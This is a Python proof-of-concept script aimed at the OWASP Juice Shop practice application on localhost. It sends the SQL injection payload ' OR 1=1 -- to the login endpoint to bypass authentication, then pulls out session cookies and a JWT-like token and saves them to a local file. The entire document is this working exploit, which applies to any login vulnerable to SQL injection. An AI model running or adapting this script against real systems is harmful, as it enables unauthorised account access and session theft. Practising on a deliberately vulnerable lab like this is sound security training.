import requests
from urllib.parse import urljoin

# ---------------------------------------------
# Configuration
# ---------------------------------------------
BASE = "http://localhost:3000"  # Base URL of the Juice Shop instance
LOGIN = "/rest/user/login"  # Login endpoint (vulnerable to SQLi)
PAYLOAD = "' OR 1=1 -- "  # Classic SQL injection payload for bypass
OUT = "captured_auth.txt"  # Output file to store captured data


def post_and_check(base):
    """
    Sends a POST request to the Juice Shop login endpoint using a SQLi payload
    and inspects the response for indicators of successful authentication.

    Behavior:
    - Constructs the full login URL.
    - Initiates a session with a custom User-Agent.
    - Sends the SQLi payload in JSON format.
    - Prints the HTTP status and a snippet of the response body.
    - Extracts cookies returned by the server.
    - Searches the response body for what looks like a JWT token (starts with 'eyJ').

    Returns:
        dict with:
            resp:   The raw requests.Response object
            cookies: Extracted cookies (dict)
            token:  Detected JWT-like token or None
            body:   Body snippet for preview
        OR
        None on request failure.
    """

    # Build full login URL
    url = urljoin(base, LOGIN)

    # Start a session to allow cookie tracking
    s = requests.Session()
    s.headers.update({"User-Agent": "JuiceShopPoC/1.0"})

    # Login request body with malicious payload
    body = {"email": PAYLOAD, "password": "x"}

    # Send POST request
    try:
        r = s.post(url, json=body, timeout=8)
    except Exception as e:
        print("Request error:", e)
        return None

    # Print status and body snippet
    print("HTTP", r.status_code)
    snippet = (r.text or "")[:800].replace("\n", " ")
    print("Body snippet:", snippet)

    # Extract cookies returned by the server
    cookies = r.cookies.get_dict()
    if cookies:
        print("Cookies:", cookies)

    # Naive JWT detection in response body
    token = None
    if "eyJ" in (r.text or ""):  # JWTs begin with the Base64 string 'eyJ'
        i = r.text.find("eyJ")
        token = r.text[i:i + 500].split()[0]
        print("Found JWT-like:", token[:80], "...")

    return {"resp": r, "cookies": cookies, "token": token, "body": snippet}


def main():
    """
    Runs the SQLi login test and saves captured data (cookies, token, snippet)
    to an output file if authentication indicators are found.
    """

    res = post_and_check(BASE)
    if not res:
        return

    # Save results only if auth markers were found
    if res["token"] or res["cookies"]:
        with open(OUT, "w", encoding="utf-8") as fh:
            fh.write(f"Target: {BASE}\n\n")
            fh.write("Cookies:\n" + str(res["cookies"]) + "\n\n")
            if res["token"]:
                fh.write("Token:\n" + res["token"] + "\n\n")
            fh.write("Body snippet:\n" + res["body"] + "\n")

        print(f"Saved capture to {OUT}")

    else:
        print("No token or cookies detected. Try inspecting the login request "
              "in the browser and adjust LOGIN or payload.")


if __name__ == "__main__":
    main()
